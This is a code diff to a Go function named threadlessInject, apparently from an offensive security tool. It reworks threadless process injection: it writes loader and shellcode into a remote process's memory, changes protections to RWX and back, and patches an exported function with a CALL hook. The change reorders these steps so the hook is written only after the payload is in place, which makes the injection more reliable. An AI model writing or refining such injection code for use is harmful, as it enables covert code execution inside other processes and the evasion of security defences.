@@ -215,21 +215,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	// Write function original bytes to loader, so it can restore after one-time execution
 	generateHook(payload, originalBytes)
 
-	// Unprotect remote function memory
-	var oldProtect uint32
-	ret, _, _ = virtualProtectEx.Call(
-		uintptr(pHandle),
-		exportAddress,
-		8,
-		windows.PAGE_EXECUTE_READWRITE,
-		uintptr(unsafe.Pointer(&oldProtect)),
-	)
-	if ret == 0 {
-		return output, fmt.Errorf("failed to unprotect function memory")
-	}
-	output += "[+] Changed function memory protection to RWX\n"
-
-	// Calculate relative address for the CALL instruction
+	// Calculate relative address for the CALL instruction (but don't write hook yet!)
 	relativeLoaderAddress := uint32(uint64(loaderAddress) - (uint64(exportAddress) + 5))
 	relativeLoaderAddressArray := make([]byte, uintsize)
 	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
@@ -243,18 +229,19 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	hook[4] = relativeLoaderAddressArray[3]
 	output += fmt.Sprintf("[+] Hook bytes: %x\n", hook)
 
-	// Hook the remote function
-	ret, _, _ = writeProcessMemory.Call(
+	// Unprotect remote function memory (but don't write hook yet!)
+	var oldProtect uint32
+	ret, _, _ = virtualProtectEx.Call(
 		uintptr(pHandle),
 		exportAddress,
-		uintptr(unsafe.Pointer(&hook[0])),
-		uintptr(len(hook)),
-		uintptr(unsafe.Pointer(&bytesRead)),
+		8,
+		windows.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
-		return output, fmt.Errorf("failed to write hook")
+		return output, fmt.Errorf("failed to unprotect function memory")
 	}
-	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)
+	output += "[+] Changed function memory protection to RWX\n"
 
 	// Unprotect loader allocated memory
 	ret, _, _ = virtualProtectEx.Call(
@@ -268,7 +255,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		return output, fmt.Errorf("failed to unprotect loader memory")
 	}
 
-	// Write loader to allocated memory
+	// Write loader+shellcode to allocated memory FIRST (before hooking!)
 	ret, _, _ = writeProcessMemory.Call(
 		uintptr(pHandle),
 		loaderAddress,
@@ -293,6 +280,19 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		return output, fmt.Errorf("failed to protect loader memory")
 	}
 	output += "[+] Changed payload memory to PAGE_EXECUTE_READ\n"
+
+	// NOW write the hook (payload is ready in memory!)
+	ret, _, _ = writeProcessMemory.Call(
+		uintptr(pHandle),
+		exportAddress,
+		uintptr(unsafe.Pointer(&hook[0])),
+		uintptr(len(hook)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to write hook")
+	}
+	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)
 
 	// Restore function protection
 	ret, _, _ = virtualProtectEx.Call(
